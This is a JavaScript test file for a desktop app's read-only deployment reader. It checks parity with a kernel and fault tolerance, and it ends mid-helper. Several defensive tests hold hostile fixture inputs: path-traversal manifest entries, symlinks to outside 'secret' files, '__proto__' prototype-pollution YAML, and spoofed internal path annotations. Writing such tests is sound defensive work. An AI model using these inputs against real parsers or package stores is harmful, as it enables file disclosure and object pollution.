// App-owned read-only deployment reader (packages/desktop/server/deployment.mjs).
//
// The packaged desktop app must not import lib/core.mjs — the reader
// replicates the READ seams only. This suite proves:
//   1. parity with the kernel on this repo (the richest fixture we have):
//      team resolution, agents roots, souls, capability agents, instances;
//   2. fault tolerance: malformed configs/souls degrade to "not visible";
//   3. the bridge is really gone: no core.mjs import, no
//      OAS_DESKTOP_FRAMEWORK_ROOT acceptance, no repo-root inference in the
//      desktop package's shipped sources.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync } from "node:fs";
import * as fsExtra from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const READER = join(ROOT, "packages", "desktop", "server", "deployment.mjs");
const reader = await import(pathToFileURL(READER).href);
const core = await import(pathToFileURL(join(ROOT, "lib", "core.mjs")).href);

test("reader parity: team scope and agents roots match the kernel on this repo", (t) => {
  const r = reader.resolveDeployment(ROOT);
  // The reader must ALWAYS resolve (fault-tolerant observation)…
  assert.ok(Array.isArray(r.chain), "reader resolves the deployment");
  // …while the kernel may legitimately throw on live-environment skew (e.g.
  // a lock/installed-store integrity mismatch between branches). Parity is
  // only comparable when the kernel itself resolves.
  let k;
  try { k = core.resolveOasConfig(ROOT); }
  catch (e) { t.diagnostic(`kernel threw (${e.message}) — reader still resolved; parity skipped`); return; }
  assert.equal(!!r.team, !!k.team, "team presence matches");
  if (r.team) {
    assert.equal(r.team.scope, k.team.scope, "team scope matches");
    assert.equal(r.team.name, k.team.name, "team name matches");
    assert.deepEqual(reader.teamAgentRoots(r.team.scope), core.teamAgentRoots(k.team.scope), "agents roots match");
  }
});

test("reader parity: souls and capability agents match the kernel", (t) => {
  const roots = (() => {
    const r = reader.resolveDeployment(ROOT);
    return r.team ? reader.teamAgentRoots(r.team.scope) : [reader.findAgentsRoot(ROOT)].filter(Boolean);
  })();
  assert.ok(roots.length, "at least one agents root");
  for (const root of roots) {
    const mine = reader.listAgents(root).map((a) => a.name).sort();
    const theirs = core.listAgents(root).map((a) => a.name).sort();
    assert.deepEqual(mine, theirs, `listAgents parity at ${root}`);
  }
  const ctx = dirname(roots[0]);
  const mineCaps = reader.listCapabilityAgents(ctx).map((c) => `${c.capability}:${c.name}`).sort();
  // Same rule as the live parity case above: the reader must ALWAYS resolve,
  // while the kernel may legitimately throw on live-environment skew — here a
  // lock anywhere in this machine's chain (including the laptop level) that the
  // strict reader refuses. Parity is only comparable when the kernel resolves;
  // the unconditional clean-fixture test below is the proof that cannot skip.
  let theirCaps;
  try { theirCaps = core.listCapabilityAgents(ctx).map((c) => `${c.capability}:${c.name}`).sort(); }
  catch (e) { t.diagnostic(`kernel threw (${e.message}) — reader still resolved; parity skipped`); return; }
  if (JSON.stringify(mineCaps) !== JSON.stringify(theirCaps)) {
    t.diagnostic(`live deployment capability skew (${mineCaps.join(", ")} vs ${theirCaps.join(", ")}); unconditional fixture below remains the parity proof`);
    return;
  }
  // capability agent resolution shape used by brain/spawn validation
  for (const c of reader.listCapabilityAgents(ctx)) {
    const soul = reader.findCapabilityAgent(ctx, roots[0], c.name);
    assert.ok(soul, `findCapabilityAgent resolves ${c.name}`);
    assert.equal(soul.kind, "capability");
    assert.equal(soul.capability, c.capability);
    assert.ok(soul._soulDir && soul._dir, "soul dirs present");
  }
});

// Unconditional parity on a CLEAN fixture: the live-repo test above may skip
// when the checkout's lock state is skewed, so this synthetic deployment is
// the parity proof that can never be skipped — the kernel MUST resolve here
// and MUST agree with the reader on every read seam.
test("reader parity (clean fixture, unconditional): kernel resolves and matches on every seam", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-clean-"));
  // team deployment: scope config + two member repos with agents roots
  writeFileSync(join(scope, "oas-config.yaml"), "name: clean-team\nteam:\n  name: clean-team\n");
  mkdirSync(join(scope, "agents"), { recursive: true });
  for (const repo of ["repo-a", "repo-b"]) {
    mkdirSync(join(scope, repo, "agents"), { recursive: true });
  }
  // a persistent soul and a tmp soul in repo-a
  const rootA = join(scope, "repo-a", "agents");
  mkdirSync(join(rootA, "dev", "soul"), { recursive: true });
  writeFileSync(join(rootA, "dev", "soul", "soul.yaml"), "name: dev\ndescription: developer soul\nkind: persistent\nwork: worktree\n");
  mkdirSync(join(rootA, "local-agents", "scratch", "soul"), { recursive: true });
  writeFileSync(join(rootA, "local-agents", "scratch", "soul", "soul.yaml"), "name: scratch\ndescription: tmp soul\n");
  // an instance with metadata under dev
  mkdirSync(join(rootA, "dev", "instances", "dev-1"), { recursive: true });
  writeFileSync(join(rootA, "dev", "instances", "dev-1", "instance.json"),
    JSON.stringify({ instance: "dev-1", agent: "dev", home: join(rootA, "dev", "instances", "dev-1") }));
  // a capability package (owned store) declaring an agent soul
  const capDir = join(scope, ".agents", "capabilities", "owned", "clean-cap");
  mkdirSync(join(capDir, "agents", "helper"), { recursive: true });
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({
    capability: "clean.cap", version: "1.0.0", description: "clean fixture capability",
    agents: ["agents/helper"], skills: ["skills"],
  }));
  writeFileSync(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\ndescription: capability helper\n");
  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "# helper\n");
  mkdirSync(join(capDir, "skills", "how-to"), { recursive: true });
  writeFileSync(join(capDir, "skills", "how-to", "SKILL.md"), "---\nname: how-to\ndescription: d\n---\n# s\n");
  writeFileSync(join(scope, "repo-a", "oas-config.yaml"),
    "name: repo-a\ncapabilities:\n  additive:\n    clean.cap:\n      from: owned\n");

  // Kernel MUST resolve on the clean fixture — no conditional escape here.
  const k = core.resolveOasConfig(join(scope, "repo-a"));
  const r = reader.resolveDeployment(join(scope, "repo-a"));
  assert.ok(k.team, "kernel resolves the team on a clean fixture");
  assert.ok(r.team, "reader resolves the team on a clean fixture");
  assert.equal(r.team.scope, k.team.scope, "team scope parity");
  assert.equal(r.team.name, k.team.name, "team name parity");
  assert.deepEqual(reader.teamAgentRoots(r.team.scope), core.teamAgentRoots(k.team.scope), "agents roots parity");

  // souls (persistent + local). The reader implements the LOCAL SOULS
  // semantics from main (030ad49: kind "local" replaces the public "tmp",
  // scope-sibling local-agents/); this branch's in-tree kernel may predate
  // that — normalize the legacy kind so parity tracks names + local-ness,
  // not the rename.
  const normKind = (k) => (k === "tmp" ? "local" : k);
  assert.deepEqual(
    reader.listAgents(rootA).map((a) => `${normKind(a.kind)}:${a.name}`).sort(),
    core.listAgents(rootA).map((a) => `${normKind(a.kind)}:${a.name}`).sort(),
    "listAgents parity (kinds and names)");
  assert.equal(reader.findAgent(rootA, "dev").name, core.findAgent(rootA, "dev").name, "findAgent parity");

  // capability agents through the config chain + package store
  const ctx = join(scope, "repo-a");
  assert.deepEqual(
    reader.listCapabilityAgents(ctx).map((c) => `${c.capability}:${c.name}`).sort(),
    core.listCapabilityAgents(ctx).map((c) => `${c.capability}:${c.name}`).sort(),
    "capability agents parity");
  const mineHelper = reader.findCapabilityAgent(ctx, rootA, "helper");
  const theirHelper = core.findCapabilityAgent(ctx, rootA, "helper");
  assert.equal(mineHelper._soulDir, theirHelper._soulDir, "capability soul dir parity");
  // instances-home: the reader uses the NEW scope-sibling local-agents/
  // (main 030ad49); a pre-local-souls in-tree kernel still homes nested
  // under the root. Accept either until the kernel lands on this branch.
  const scopeSibling = join(dirname(rootA), "local-agents", "helper");
  const nestedLegacy = join(rootA, "local-agents", "helper");
  assert.equal(mineHelper._dir, scopeSibling, "reader homes capability instances in the scope sibling");
  assert.ok([scopeSibling, nestedLegacy].includes(theirHelper._dir), "kernel homes in a known local-agents location");
  assert.deepEqual(reader.capabilitySkillDirs("clean.cap", ctx).map((s) => s.dir), core.capabilitySkillDirs("clean.cap", ctx), "skill dirs parity");

  // instances
  assert.deepEqual(
    reader.listInstances(rootA).map((a) => ({ name: a.name, instances: a.instances.map((i) => i.instance).sort() })).sort((x, y) => x.name.localeCompare(y.name)),
    core.listInstances(rootA).map((a) => ({ name: a.name, instances: a.instances.map((i) => i.instance).sort() })).sort((x, y) => x.name.localeCompare(y.name)),
    "listInstances parity");
});

test("reader parity: listInstances shape matches the kernel", () => {
  const root = reader.findAgentsRoot(ROOT);
  assert.ok(root, "agents root found");
  const mine = reader.listInstances(root);
  const theirs = core.listInstances(root);
  assert.deepEqual(
    mine.map((a) => ({ name: a.name, instances: a.instances.map((i) => i.instance).sort() })).sort((x, y) => x.name.localeCompare(y.name)),
    theirs.map((a) => ({ name: a.name, instances: a.instances.map((i) => i.instance).sort() })).sort((x, y) => x.name.localeCompare(y.name)),
    "same souls and instance names");
});

test("reader: local souls (scope-sibling local-agents/) are first-class roster citizens", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-local-"));
  // committed persistent soul under agents/, LOCAL soul under the SIBLING
  // local-agents/ (gitignored by kernel contract — invisible to git, fully
  // visible to the app)
  const root = join(scope, "agents");
  mkdirSync(join(root, "dev", "soul"), { recursive: true });
  writeFileSync(join(root, "dev", "soul", "soul.yaml"), "name: dev\ndescription: committed soul\n");
  const localBase = join(scope, "local-agents");
  mkdirSync(join(localBase, "my-local", "soul"), { recursive: true });
  writeFileSync(join(localBase, "my-local", "soul", "soul.yaml"), "name: my-local\ndescription: machine-local soul\nkind: local\n");
  mkdirSync(join(localBase, "my-local", "instances", "my-local-1"), { recursive: true });
  writeFileSync(join(localBase, "my-local", "instances", "my-local-1", "instance.json"),
    JSON.stringify({ instance: "my-local-1", agent: "my-local" }));
  // legacy kind: tmp reads as local
  mkdirSync(join(localBase, "old-tmp", "soul"), { recursive: true });
  writeFileSync(join(localBase, "old-tmp", "soul", "soul.yaml"), "name: old-tmp\nkind: tmp\n");

  const agents = reader.listAgents(root);
  const byName = new Map(agents.map((a) => [a.name, a]));
  assert.ok(byName.has("dev"), "persistent soul listed");
  assert.equal(byName.get("my-local").kind, "local", "sibling local soul listed as kind local");
  assert.equal(byName.get("old-tmp").kind, "local", "legacy kind tmp normalizes to local");
  // findAgent resolves local souls by name (brain/spawn-validation seam)
  assert.equal(reader.findAgent(root, "my-local").kind, "local");
  assert.equal(reader.findAgent(root, "my-local")._dir, join(localBase, "my-local"), "soul dir is the scope sibling");
  // instances of local souls surface in the roster walk
  const inst = reader.listInstances(root).find((a) => a.name === "my-local");
  assert.ok(inst, "local soul appears in listInstances");
  assert.deepEqual(inst.instances.map((i) => i.instance), ["my-local-1"], "its instance surfaces");
});

test("reader: an ALL-LOCAL scope (no agents/ at all) resolves and rosters", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-alllocal-"));
  const localBase = join(scope, "local-agents");
  mkdirSync(join(localBase, "solo", "soul"), { recursive: true });
  writeFileSync(join(localBase, "solo", "soul", "soul.yaml"), "name: solo\ndescription: only local souls here\n");
  // root discovery: canonical root is the (absent) sibling agents/
  const root = reader.findAgentsRoot(scope);
  assert.equal(root, join(scope, "agents"), "canonical root beside local-agents, even when absent");
  // walking up from INSIDE local-agents/ finds the same root
  assert.equal(reader.findAgentsRoot(join(localBase, "solo")), join(scope, "agents"));
  // the roster still lists the local soul through the absent root
  const agents = reader.listAgents(root);
  assert.deepEqual(agents.map((a) => `${a.kind}:${a.name}`), ["local:solo"], "all-local scope rosters its souls");
  // team scopes count all-local members
  const team = mkdtempSync(join(tmpdir(), "oas-reader-teamlocal-"));
  writeFileSync(join(team, "oas-config.yaml"), "name: t\nteam:\n  name: t\n");
  mkdirSync(join(team, "member-a", "agents"), { recursive: true });          // classic member
  mkdirSync(join(team, "member-b", "local-agents", "x", "soul"), { recursive: true }); // all-local member
  writeFileSync(join(team, "member-b", "local-agents", "x", "soul", "soul.yaml"), "name: x\n");
  const roots = reader.teamAgentRoots(team);
  assert.ok(roots.includes(join(team, "member-a", "agents")), "classic member root found");
  assert.ok(roots.includes(join(team, "member-b", "agents")), "all-local member surfaces via its canonical (absent) agents root");
});

test("reader: malformed configs and souls degrade instead of throwing", () => {
  const base = mkdtempSync(join(tmpdir(), "oas-reader-"));
  // invalid oas-config.yaml at the top level — chain must skip it
  writeFileSync(join(base, "oas-config.yaml"), ": : :\n\t\tbroken");
  mkdirSync(join(base, "agents", "good-soul", "soul"), { recursive: true });
  writeFileSync(join(base, "agents", "good-soul", "soul", "soul.yaml"), "name: good-soul\ndescription: fine\n");
  mkdirSync(join(base, "agents", "bad-soul", "soul"), { recursive: true });
  // unreadable soul.yaml (a directory where a file should be) — must skip
  mkdirSync(join(base, "agents", "bad-soul", "soul", "soul.yaml"), { recursive: true });
  const r = reader.resolveDeployment(base);
  assert.ok(Array.isArray(r.chain), "chain resolves despite the broken level");
  const agents = reader.listAgents(join(base, "agents"));
  assert.deepEqual(agents.map((a) => a.name), ["good-soul"], "broken soul skipped, good soul listed");
  assert.equal(reader.findAgentsRoot(base), join(base, "agents"), "read-only root discovery");
});

test("reader: manifest paths escaping the package boundary do not resolve", () => {
  const base = mkdtempSync(join(tmpdir(), "oas-reader-esc-"));
  const capDir = join(base, ".agents", "capabilities", "installed", "evil");
  mkdirSync(capDir, { recursive: true });
  writeFileSync(join(base, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    evil.cap: {}\n");
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({
    capability: "evil.cap", version: "1.0.0", description: "x",
    agents: ["../../../../outside-soul"], skills: ["../../.."],
  }));
  mkdirSync(join(base, "outside-soul"), { recursive: true });
  writeFileSync(join(base, "outside-soul", "soul.yaml"), "name: outside\n");
  assert.deepEqual(reader.listCapabilityAgents(base), [], "escaping agents path never resolves");
  assert.deepEqual(reader.capabilitySkillDirs("evil.cap", base), [], "escaping skills path never resolves");
});

test("reader: nested soul.yaml/SKILL.md symlinks escaping the package never get read", () => {
  const base = mkdtempSync(join(tmpdir(), "oas-reader-nest-"));
  const { symlinkSync } = fsExtra;
  // Secret files OUTSIDE the package that symlinks will point at.
  writeFileSync(join(base, "outside-soul.yaml"), "name: leaked\ndescription: TOP-SECRET-SOUL\n");
  writeFileSync(join(base, "outside-skill.md"), "---\nname: leaked-skill\ndescription: TOP-SECRET-SKILL\n---\n# s\n");
  const capDir = join(base, ".agents", "capabilities", "installed", "nest");
  mkdirSync(join(capDir, "agents", "helper"), { recursive: true });
  mkdirSync(join(capDir, "skills", "sneaky"), { recursive: true });
  writeFileSync(join(base, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    nest.cap: {}\n");
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({
    capability: "nest.cap", version: "1.0.0", description: "x",
    agents: ["agents/helper"], skills: ["skills"],
  }));
  // The DIRECTORIES are contained — only the nested FILES are symlinks out.
  symlinkSync(join(base, "outside-soul.yaml"), join(capDir, "agents", "helper", "soul.yaml"));
  symlinkSync(join(base, "outside-skill.md"), join(capDir, "skills", "sneaky", "SKILL.md"));
  // agent: the escaping soul.yaml must never be parsed — agent not listed
  assert.deepEqual(reader.listCapabilityAgents(base), [], "agent behind an escaping soul.yaml symlink is not listed");
  assert.equal(reader.findCapabilityAgent(base, join(base, "agents"), "leaked"), undefined, "nor resolvable by its leaked name");
  assert.equal(reader.findCapabilityAgent(base, join(base, "agents"), "helper"), undefined, "nor by its directory name");
  // skills: the tree dir resolves (it IS contained), but per-file containment
  // must reject the escaping SKILL.md — exposed via containsPackageFile.
  const dirs = reader.capabilitySkillDirs("nest.cap", base);
  assert.equal(dirs.length, 1, "contained skill tree resolves");
  const skillMd = join(dirs[0].dir, "sneaky", "SKILL.md");
  assert.equal(reader.containsPackageFile(dirs[0].packageDir, skillMd), false,
    "escaping nested SKILL.md fails the per-file containment probe");
  // a genuinely contained file passes
  writeFileSync(join(capDir, "skills", "good.md"), "ok");
  assert.equal(reader.containsPackageFile(dirs[0].packageDir, join(capDir, "skills", "good.md")), true);
});

test("reader: semantically malformed instance.json degrades to the bare instance, hides nothing", () => {
  const base = mkdtempSync(join(tmpdir(), "oas-reader-meta-"));
  const root = join(base, "agents");
  mkdirSync(join(root, "dev", "soul"), { recursive: true });
  writeFileSync(join(root, "dev", "soul", "soul.yaml"), "name: dev\ndescription: d\n");
  const mk = (name, content) => {
    mkdirSync(join(root, "dev", "instances", name), { recursive: true });
    if (content !== undefined) writeFileSync(join(root, "dev", "instances", name, "instance.json"), content);
  };
  mk("dev-null", "null");                                   // JSON.parse OK, not an object
  mk("dev-array", "[1,2]");                                 // array
  mk("dev-scalar", '"hi"');                                 // scalar
  mk("dev-empty", "{}");                                    // object missing required fields
  mk("dev-badtypes", JSON.stringify({ instance: 42, home: null })); // wrong types
  mk("dev-good", JSON.stringify({ instance: "dev-good", agent: "dev", extra: "kept" }));
  mk("dev-bare");                                           // no instance.json at all
  const agents = reader.listInstances(root);
  assert.equal(agents.length, 1);
  const byName = new Map(agents[0].instances.map((i) => [i.instance, i]));
  // EVERY directory surfaces — one malformed file must not hide siblings
  for (const name of ["dev-null", "dev-array", "dev-scalar", "dev-empty", "dev-badtypes", "dev-good", "dev-bare"]) {
    const inst = byName.get(name);
    assert.ok(inst, `${name} surfaces in the roster`);
    assert.equal(typeof inst.instance, "string", `${name}: instance is a string`);
    assert.equal(typeof inst.home, "string", `${name}: home is a string`);
    assert.ok(inst.home.endsWith(name), `${name}: home falls back to the directory`);
  }
  assert.equal(byName.get("dev-good").extra, "kept", "valid metadata still merges over the fallback");
});

// ---- bridge absence: the shipped desktop package carries no kernel tie ----

function desktopSources() {
  const pkg = join(ROOT, "packages", "desktop");
  const files = [];
  const walk = (d) => {
    for (const e of readdirSync(join(pkg, d), { withFileTypes: true })) {
      if (["node_modules", "vendor", "test"].includes(e.name)) continue;
      const p = join(d, e.name);
      if (e.isDirectory()) walk(p);
      else if (/\.(mjs|cjs)$/.test(e.name)) files.push(p);
    }
  };
  walk(".");
  return files.map((f) => [f, readFileSync(join(pkg, f), "utf8")]);
}

test("no shipped desktop source imports the checkout kernel or accepts a framework-root override", () => {
  for (const [f, src] of desktopSources()) {
    assert.ok(!src.includes("lib/core.mjs"), `${f}: references the checkout kernel`);
    assert.ok(!src.includes("OAS_DESKTOP_FRAMEWORK_ROOT"), `${f}: accepts the framework-root env override`);
    assert.ok(!/FRAMEWORK_ROOT|REPO_ROOT/.test(src), `${f}: infers a repo/framework root`);
  }
});

test("desktop hides tampered locked capability agents while kernel fails closed", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-agent-trust-"));
  writeFileSync(join(scope, "oas-config.yaml"), "name: trust\ncapabilities:\n  additive:\n    locked.agent:\n      from: installed\n");
  const capDir = join(scope, ".agents", "capabilities", "installed", "locked-agent");
  mkdirSync(join(capDir, "agents", "helper"), { recursive: true });
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({ capability: "locked.agent", version: "1.0.0", description: "d", agents: ["agents/helper"] }));
  writeFileSync(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "SAFE\n");
  writeFileSync(join(scope, "oas-lock.json"), JSON.stringify({ lockfileVersion: 1, capabilities: {
    "locked.agent": { source: "path:/fixture", version: "1.0.0", integrity: core.capabilityIntegrity(capDir), trustedExecutables: false },
  } }));
  const root = join(scope, "agents"); mkdirSync(root);
  assert.equal(core.listCapabilityAgents(scope).length, 1, "kernel allows instruction-only surface at exact integrity without executable approval");
  assert.equal(reader.listCapabilityAgents(scope).length, 1);
  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "TAMPERED\n");
  const kernelList = core.listCapabilityAgents(scope);
  assert.deepEqual(kernelList, [], "kernel degrades tampered provider independently");
  assert.equal(kernelList.diagnostics[0].capability, "locked.agent");
  assert.deepEqual(reader.listCapabilityAgents(scope), [], "desktop degrades tampered provider to invisible");
  assert.equal(reader.findCapabilityAgent(scope, root, "helper"), undefined, "desktop find cannot expose tampered agent");
  fsExtra.rmSync(scope, { recursive: true, force: true });
});

test("desktop discards whole invalid lock files before capability-agent trust", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-invalid-lock-"));
  writeFileSync(join(scope, "oas-config.yaml"), "name: trust\ncapabilities:\n  additive:\n    valid.agent:\n      from: installed\n");
  const capDir = join(scope, ".agents", "capabilities", "installed", "valid-agent");
  mkdirSync(join(capDir, "agents", "helper"), { recursive: true });
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({ capability: "valid.agent", version: "1.0.0", description: "d", agents: ["agents/helper"] }));
  writeFileSync(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  const good = { source: "path:/fixture", version: "1.0.0", integrity: core.capabilityIntegrity(capDir), trustedExecutables: false };
  const file = join(scope, "oas-lock.json");
  const invalidBodies = [
    "{", "null", "1", "[]",
    JSON.stringify({ lockfileVersion: 3, capabilities: { "valid.agent": good } }),
    JSON.stringify({ lockfileVersion: 2, packages: null, capabilities: { "valid.agent": good } }),
    JSON.stringify({ lockfileVersion: 1, capabilities: [] }),
    JSON.stringify({ lockfileVersion: 1, capabilities: { "valid.agent": good, "bad.agent": null } }),
    JSON.stringify({ lockfileVersion: 1, capabilities: { "valid.agent": { ...good, integrity: "bad" } } }),
  ];
  for (const body of invalidBodies) {
    writeFileSync(file, body);
    assert.deepEqual(reader.listCapabilityAgents(scope), [], `invalid whole lock invisible: ${body}`);
    assert.equal(reader.findCapabilityAgent(scope, join(scope, "agents"), "helper"), undefined);
  }
  fsExtra.rmSync(scope, { recursive: true, force: true });
});

test("the app-owned readers refuse __proto__ as a mapping key and pollute nothing", () => {
  // The kernel's readers refuse it; the docs say "refused by every YAML reader".
  // The desktop reader is a SECOND implementation of the same subset, so the
  // claim is only true if it refuses too.
  for (const doc of [
    "__proto__:\n  polluted: true\n",                                      // nested map
    "__proto__: {polluted: true}\n",                                       // inline map
    "capabilities:\n  additive:\n    __proto__:\n      polluted: true\n",  // nested under a real key
    'name: demo\n"__proto__": {polluted: true}\n',                         // quoted spelling
  ]) {
    assert.throws(() => reader.parseYamlNested(doc), (e) => e.code === "unsafe-config-key", doc);
  }
  assert.throws(() => reader.parseYamlFlat("__proto__: polluted\n"), (e) => e.code === "unsafe-config-key");
  assert.throws(() => reader.parseFrontmatter("---\n__proto__: polluted\n---\nbody\n"), (e) => e.code === "unsafe-config-key");
  assert.equal(Object.prototype.polluted, undefined);
  assert.equal({}.polluted, undefined);
  // Ordinary documents still parse (control).
  assert.equal(reader.parseYamlNested("name: demo\nteam:\n  name: Demo\n").team.name, "Demo");
  assert.deepEqual(reader.parseYamlFlat("name: helper\nkind: local\n"), { name: "helper", kind: "local" });
});

test("a config carrying __proto__ degrades to not-visible, it does not crash the reader", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-proto-"));
  writeFileSync(join(scope, "oas-config.yaml"), "name: demo\n__proto__:\n  team:\n    name: Smuggled\n");
  // The reader's contract: a document it refuses is skipped, never fatal.
  assert.deepEqual(reader.configChain(scope), []);
  assert.equal(reader.resolveDeployment(scope).team, null);
  assert.deepEqual(reader.listCapabilityAgents(scope), []);
  // A soul.yaml doing the same is invisible rather than fatal.
  const root = join(scope, "agents");
  mkdirSync(join(root, "ghost", "soul"), { recursive: true });
  writeFileSync(join(root, "ghost", "soul", "soul.yaml"), "__proto__: polluted\nname: ghost\n");
  assert.deepEqual(reader.listAgents(root).map((a) => a.name), []);
  assert.equal(Object.prototype.polluted, undefined);
  fsExtra.rmSync(scope, { recursive: true, force: true });
});

test("capability-id keyed reader maps never answer for an inherited name", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-inherited-"));
  writeFileSync(join(scope, "oas-config.yaml"), "name: demo\ncapabilities:\n  additive:\n    constructor:\n      from: installed\n");
  // No such capability is installed. A plain manifest map would answer
  // Object.prototype.constructor, and a plain LOCK map would answer `Object`
  // for the trust lookup — whose `.integrity` is the same `undefined` a failed
  // digest returns, i.e. trust decided by the prototype.
  assert.deepEqual(reader.listCapabilityAgents(scope), []);
  assert.deepEqual(reader.capabilitySkillDirs("constructor", scope), []);
  assert.deepEqual(reader.capabilitySkillDirs("toString", scope), []);
  fsExtra.rmSync(scope, { recursive: true, force: true });
});

test("a soul.yaml cannot declare the reader's own annotations about itself", () => {
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-annotation-spoof-"));
  const root = join(scope, "agents");
  const elsewhere = join(scope, "elsewhere");
  mkdirSync(join(root, "ghost", "soul"), { recursive: true });
  mkdirSync(elsewhere, { recursive: true });
  // The brain view resolves a soul directory as `def._soulDir || join(def._dir,
  // "soul")`, so a soul.yaml that could set `_soulDir` would point the
  // skills/knowledge read at any directory on the machine — and `_packageDir`
  // is the containment boundary that walk applies. Both are the READER's
  // findings, never the document's claim.
  writeFileSync(join(root, "ghost", "soul", "soul.yaml"),
    `name: ghost\n_soulDir: ${elsewhere}\n_dir: ${elsewhere}\n_packageDir: ${elsewhere}\n`);

  const def = reader.findAgent(root, "ghost");
  assert.equal(def.name, "ghost");
  assert.equal(def._soulDir, undefined, "the soul redirected its own soul directory");
  assert.equal(def._packageDir, undefined, "the soul redirected its own containment boundary");
  assert.equal(def._dir, join(root, "ghost"));
  assert.deepEqual(reader.listAgents(root).map((a) => a._dir), [join(root, "ghost")]);

  // A capability agent still gets a real `_soulDir` — the annotation works, it
  // just cannot come from the document (control).
  writeFileSync(join(scope, "oas-config.yaml"), "name: trust\ncapabilities:\n  additive:\n    owned.agent:\n      from: owned\n");
  const ownedDir = join(scope, ".agents", "capabilities", "owned", "owned-agent");
  mkdirSync(join(ownedDir, "agents", "helper"), { recursive: true });
  writeFileSync(join(ownedDir, "oas.json"), JSON.stringify({ capability: "owned.agent", version: "1.0.0", description: "d", agents: ["agents/helper"] }));
  writeFileSync(join(ownedDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  assert.equal(reader.findCapabilityAgent(scope, root, "helper")._soulDir, join(ownedDir, "agents", "helper"));
  fsExtra.rmSync(scope, { recursive: true, force: true });
});

// ---- revised-v2 capability locks --------------------------------------------

/** A real v2-locked scope: one package, one capability, one shipped agent soul,
 * acquired through the ENGINE so the lock is whatever the kernel actually
 * writes today — never a hand-rolled approximation of it. */
function v2Scope(label) {
  const base = mkdtempSync(join(tmpdir(), `oas-reader-${label}-`));
  const src = join(base, "src");
  const w = (p, c) => { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, c); };
  w(join(src, "capabilities", "helper", "oas.json"), JSON.stringify({
    capability: "x.helper", version: "1.0.0", description: "cap", agents: ["agents/helper"],
  }));
  w(join(src, "capabilities", "helper", "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  w(join(src, "capabilities", "helper", "agents", "helper", "AGENTS.md"), "SAFE\n");
  w(join(src, "oas-package.json"), JSON.stringify({
    package: "x.p", version: "1.0.0", description: "p",
    compatibility: { oas: ">=0.1.0" }, capabilities: ["capabilities/helper"],
  }));
  const scope = join(base, "scope");
  w(join(scope, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    x.helper:\n      from: installed\n      global: true\n");
  core.acquirePackage(scope, src);
  return { base, scope, lockFile: join(scope, "oas-lock.json"), capDir: join(scope, ".agents", "capabilities", "installed", "x.helper") };
}

test("the desktop reads REVISED-V2 capability locks: a v2-locked provider's agents are visible, a drifted one is not", () => {
  const { base, scope, lockFile, capDir } = v2Scope("v2-lock");
  const lock = JSON.parse(readFileSync(lockFile, "utf8"));
  // Pin the shape this case is about, so it fails loudly if the kernel's lock
  // changes rather than silently testing something else.
  assert.equal(lock.lockfileVersion, 2);
  assert.deepEqual(Object.keys(lock.capabilities["x.helper"]).sort(), ["integrity", "package", "path", "trusted", "version"]);
  assert.equal(Object.hasOwn(lock.packages["x.p"], "capabilities"), false, "revised-v2 package rows carry no capability list");

  // The regression: the reader demanded v1 row fields AND transitional package
  // rows, so it discarded every real v2 lock and the deployment's capability
  // agents went invisible in the app while the kernel served them.
  assert.deepEqual(core.listCapabilityAgents(scope).map((a) => a.name), ["helper"]);
  assert.deepEqual(reader.listCapabilityAgents(scope).map((a) => a.name), ["helper"], "a v2-locked provider is invisible to the desktop");
  assert.equal(reader.findCapabilityAgent(scope, join(scope, "agents"), "helper")?.name, "helper");

  // Trust still binds to the exact artifact: one tampered byte hides it again.
  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "TAMPERED\n");
  assert.deepEqual(core.listCapabilityAgents(scope), []);
  assert.deepEqual(reader.listCapabilityAgents(scope), [], "a drifted v2 artifact stayed visible");
  fsExtra.rmSync(base, { recursive: true, force: true });
});

test("the v2 digest is the MATERIALIZED ARTIFACT digest: the provenance file counts", () => {
  const { base, scope, capDir } = v2Scope("v2-digest");
  // The v1 digest excludes the artifact-root lock file; the v2 artifact digest
  // excludes NOTHING — capability source, runtime closure and the generated
  // provenance file all count. Reproducing only the v1 digest read every
  // correctly installed v2 artifact as drifted, so pin the difference on a file
  // the two digests disagree about.
  assert.deepEqual(reader.listCapabilityAgents(scope).map((a) => a.name), ["helper"]);
  mkdirSync(join(capDir, ".git"), { recursive: true });
  writeFileSync(join(capDir, ".git", "HEAD"), "ref: refs/heads/main\n");
  assert.deepEqual(core.listCapabilityAgents(scope), [], "the kernel counts .git inside a materialized artifact");
  assert.deepEqual(reader.listCapabilityAgents(scope), [], "the desktop must count exactly what the kernel counts");
  fsExtra.rmSync(base, { recursive: true, force: true });
});

/** A legacy v1-locked scope: an installed capability artifact plus a v1 lock
 * whose integrity is the kernel's own standalone-capability digest of it. The
 * kernel no longer WRITES v1, so the row is built from `core.capabilityIntegrity`
 * rather than hand-rolled — the point of the fixture is that both readers agree
 * about the same bytes. */
function v1Scope(label) {
